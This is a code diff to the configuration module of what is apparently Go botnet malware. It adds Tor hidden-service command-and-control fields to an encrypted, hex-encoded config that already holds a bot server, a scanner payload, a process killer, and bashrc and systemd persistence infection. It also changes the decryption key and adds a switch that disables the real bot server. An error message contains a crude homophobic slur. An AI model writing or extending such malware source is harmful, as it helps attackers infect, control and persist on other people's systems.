@@ -16,6 +16,8 @@ import (
 // CONFIG
 
 /*
+
+
 1 - server ip   :: string
 2 - server port :: string
 3 - ignore signals      :: bool
@@ -30,15 +32,25 @@ import (
 12 - systemd infection :: bool
 13 - payload       :: string
 
+14 - tor server url (.onion) :: string
+15 - tor server port :: string
+16 - tor enabled :: bool
+
+
 \\ - separator
 */
 
 var (
-	CONFIG = "354a682b796a4a2b3831773764506d3358786564583830425141386d504f57744c716e50706b532b7752704752784a427476467667684a6a476f37345a2b2f2f5369534e75794254722b4169694f6c416d7862435844587339704168496859726b78596459434c6973674b6238354c4844513d3d"
+	CONFIG = "7685a6444793354346e355477694c55715161336e68696c7a4e72654c306a584f4466314a774b644658715854766a703835724b437273496c6970724d787679313945595a76617685a6444793354346e355477694c55715161336e68696c7a4e72654c306a584f4466314a774b644658715854766a703835724b437273496c6970724d787679313945595a7661"
 )
 
 // DO NOT CHANGE
 var (
+	TOR_SERVER string
+	TOR_PORT   string
+
+	TOR_ENABLED bool
+
 	BOT_SERVER string
 	BOT_PORT   string
 
@@ -61,11 +73,13 @@ var (
 
 	MIN_KILLER_PID int
 	MAX_KILLER_PID int
+
+	DISABLE_REAL_BOT_SERVER bool
 )
 
 func Config() {
 
-	key := []byte{111, 104, 54, 117, 109, 97, 101, 90, 109, 122, 70, 57, 52, 104, 77, 100, 56, 66, 84, 51, 80, 68, 73, 56, 73, 90, 71, 73, 87, 43, 90, 70}
+	key := []byte{120, 70, 64, 48, 52, 101, 80, 55, 65, 78, 33, 66, 103, 76, 101, 117, 53, 53, 69, 73, 35, 75, 76, 74, 83, 86, 97, 33, 81, 118, 56, 80}
 
 	dec, err := hex.DecodeString(CONFIG)
 	if err != nil {
@@ -77,14 +91,19 @@ func Config() {
 		os.Exit(0)
 	}
 
-	res := strings.Split(decrypted, "\\")
+	res := strings.Split(decrypted, "\\\\")
 
 	if len(res) < 8 {
+		println("fuck u stupid gay")
 		os.Exit(0)
 	}
 
 	BOT_SERVER = res[0]
 	BOT_PORT = res[1]
+
+	if BOT_SERVER == "disable" && BOT_PORT == "disable" {
+		DISABLE_REAL_BOT_SERVER = true
+	}
 
 	IGNORE_SIGNALS, _ = strconv.ParseBool(res[2])
 
@@ -101,6 +120,7 @@ func Config() {
 	MIN_KILLER_PID, _ = strconv.Atoi(strings.Split(res[8], "|")[0])
 
 	maxkiller, _ := strconv.Atoi(strings.Split(res[8], "|")[1])
+
 	if maxkiller == -1 {
 		MAX_KILLER_PID = 1 << 30
 	}
@@ -110,11 +130,15 @@ func Config() {
 	SYSTEMD_INFECTION_ENABLED, _ = strconv.ParseBool(res[11])
 
 	SCANNER_PAYLOAD = res[12]
+	TOR_SERVER = res[13]
+	TOR_PORT = res[14]
+
+	TOR_ENABLED, _ = strconv.ParseBool(res[15])
 
 	BINARY_FILE, _ = os.ReadFile(os.Args[0])
 
 	if DEBUG {
-		fmt.Printf("CONFIG:\nBot server: %s\nBot port: %s\nScanner enabled: %t\nScanner payload: %s\nScanner min num cpu: %d\nMax cpu value: %d\nIgnore signals: %t\nPid changer: %t\nKiller enabled: %t\nBashrc inf. enabled: %t\nSystemd inf. enabled: %t\nMin-Max killer pid: %d-%d\n------------------------\n", BOT_SERVER, BOT_PORT, SCANNER_ENABLED, SCANNER_PAYLOAD, SCANNER_MIN_NUM_CPU, MAX_CPU_VALUE, IGNORE_SIGNALS, PID_CHANGER, KILLER_ENABLED, BASHRC_INFECTION_ENABLED, SYSTEMD_INFECTION_ENABLED, MIN_KILLER_PID, MAX_KILLER_PID)
+		fmt.Printf("CONFIG:\nTor Enabled: %t\nTor Server: %s\nTor Port: %s\nBot server: %s\nBot port: %s\nScanner enabled: %t\nScanner payload: %s\nScanner min num cpu: %d\nMax cpu value: %d\nIgnore signals: %t\nPid changer: %t\nKiller enabled: %t\nBashrc inf. enabled: %t\nSystemd inf. enabled: %t\nMin-Max killer pid: %d-%d\n------------------------\n", TOR_ENABLED, TOR_SERVER, TOR_PORT, BOT_SERVER, BOT_PORT, SCANNER_ENABLED, SCANNER_PAYLOAD, SCANNER_MIN_NUM_CPU, MAX_CPU_VALUE, IGNORE_SIGNALS, PID_CHANGER, KILLER_ENABLED, BASHRC_INFECTION_ENABLED, SYSTEMD_INFECTION_ENABLED, MIN_KILLER_PID, MAX_KILLER_PID)
 	}
 }
 
